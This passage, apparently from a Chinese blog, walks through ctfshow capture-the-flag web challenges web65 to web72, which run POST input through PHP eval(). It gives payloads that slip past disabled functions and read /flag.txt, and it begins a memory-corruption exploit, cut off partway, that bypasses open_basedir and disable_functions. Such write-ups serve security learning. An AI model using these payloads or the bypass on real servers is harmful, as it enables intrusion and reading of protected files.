class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>同上白嫖payload\n</code></pre>\n<pre><code>ctfshow&#123;f07b04e9-ec66-475a-adaa-dcb71a4ee326&#125;\n</code></pre>\n<h2 id=\"web66\"><a class=\"anchor\" href=\"#web66\">#</a> web66</h2>\n<p>命令执行，突破禁用函数，求你们别秀了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>新过滤了show_source()函数。\n\n这时我们用highlight_file()函数查看，发现可能flag不在这个位置，print_r(scandir('.'))查看flag有没有改名，再查看一下根目录，发现有个flag.txt查看记得得到flag\n</code></pre>\n<pre><code>payload\nc=highlight_file('/flag.txt');\n</code></pre>\n<pre><code>ctfshow&#123;10798615-2191-4957-89d5-336c633d6d3c&#125;\n</code></pre>\n<h2 id=\"web67\"><a class=\"anchor\" href=\"#web67\">#</a> web67</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>过滤了print_r，题解跟上题一致，用var_dump()即可\n\npayload:\nc=highlight_file('/flag.txt');\n</code></pre>\n<pre><code>ctfshow&#123;623b27c5-a9ad-46dc-8d0c-3afb735cac76&#125;\n</code></pre>\n<h2 id=\"web68\"><a class=\"anchor\" href=\"#web68\">#</a> web68</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Warning<span class=\"token punctuation\">:</span> <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> has been disabled <span class=\"token keyword\">for</span> security reasons in <span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span><span class=\"token function\">php</span><span class=\"token punctuation\">(</span><span class=\"token number\">17</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>'d code on line <span class=\"token number\">1</span></pre></td></tr></table></figure><pre><code>相当于highlight_file()被禁用了，但尝试后发现include和var_dump没有过滤\n\npayload:\nc=var_dump(scandir('/'));\t//发现flag.txt\nc=include('/flag.txt');\t//因为flag.txt没有php前缀，所以直接回显内容\n</code></pre>\n<pre><code>ctfshow&#123;64e1a348-7dd5-43a0-9f0e-922f00bc27a1&#125;\n</code></pre>\n<h2 id=\"web69\"><a class=\"anchor\" href=\"#web69\">#</a> web69</h2>\n<p>禁用了 var_dump ()，但 payload 和上题同解，问就是猜的</p>\n<h2 id=\"web70\"><a class=\"anchor\" href=\"#web70\">#</a> web70</h2>\n<p>payload 和上题同解，问就是猜的</p>\n<h2 id=\"web71\"><a class=\"anchor\" href=\"#web71\">#</a> web71</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'display_errors'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">ob_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token function\">ob_end_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]|[a-z]/i\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"?\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>你要上天吗？</pre></td></tr></table></figure><pre><code>解题思路：\neval()已经执行然后讲结果替换成问号，那我们就在eval执行完后结束程序\n\npayload：\nc=include('/flag.txt');exit();\n</code></pre>\n<pre><code>ctfshow&#123;2e525fc3-7391-4395-a9d4-45ce5f0a91c1&#125; \n</code></pre>\n<h2 id=\"web72\"><a class=\"anchor\" href=\"#web72\">#</a> web72</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'display_errors'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// 你们在炫技吗？</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">ob_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token function\">ob_end_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]|[a-z]/i\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"?\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>你要上天吗？</pre></td></tr></table></figure><pre><code>存在open_basedir，利用glob伪协议在筛选目录时不受open_basedir制约\n</code></pre>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 此脚本获取文件名</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>c<span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glob:///*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$f</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"    \"</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 此脚本绕过 open_basedir 和 disable_functions，URL 编码得到结果</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Vuln</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">getTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token function\">debug_backtrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Helper</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$address</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$s</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span><span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token variable\">$address</span> <span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token variable\">$address</span> <span class=\"token operator\">|=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span><span class=\"token operator\">+</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$address</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ptr2str</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token variable\">$out</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token variable\">$out</span> <span class=\"token operator\">.=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token variable\">$ptr</span> <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">write</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token 